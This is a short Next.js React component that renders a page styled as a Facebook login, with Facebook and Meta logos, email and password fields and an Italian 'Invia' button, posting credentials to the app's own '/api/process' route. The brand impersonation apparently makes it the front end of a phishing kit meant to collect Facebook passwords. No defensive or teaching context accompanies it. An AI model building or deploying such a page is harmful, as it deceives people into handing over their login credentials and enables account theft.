'use client';

export default function Home() {
  return (
    <main style={{
      display: 'flex',
      flexDirection: 'column',
      alignItems: 'center',
      padding: '2rem',
      fontFamily: 'Arial, sans-serif'
    }}>
      {/* Logo Facebook */}
      <img src="/facebook.png" alt="Facebook Logo" style={{ width: '100px', marginBottom: '1rem' }} />

      {/* Form */}
      <form
        action="/api/process"
        method="POST"
        style={{
          display: 'flex',
          flexDirection: 'column',
          gap: '1rem',
          width: '100%',
          maxWidth: '300px'
        }}
      >
        <input type="text" name="email" placeholder="Email" required style={{ padding: '0.5rem' }} />
        <input type="password" name="password" placeholder="Password" required style={{ padding: '0.5rem' }} />
        <button type="submit" style={{
          padding: '0.75rem',
          backgroundColor: '#4267B2',
          color: 'white',
          border: 'none',
          borderRadius: '4px'
        }}>
          Invia
        </button>

        {/* Logo Meta centrato */}
        <div style={{ textAlign: 'center', marginTop: '1rem' }}>
          <img src="/meta.png" alt="Meta Logo" style={{ width: '60px' }} />
        </div>
      </form>
    </main>
  );
}
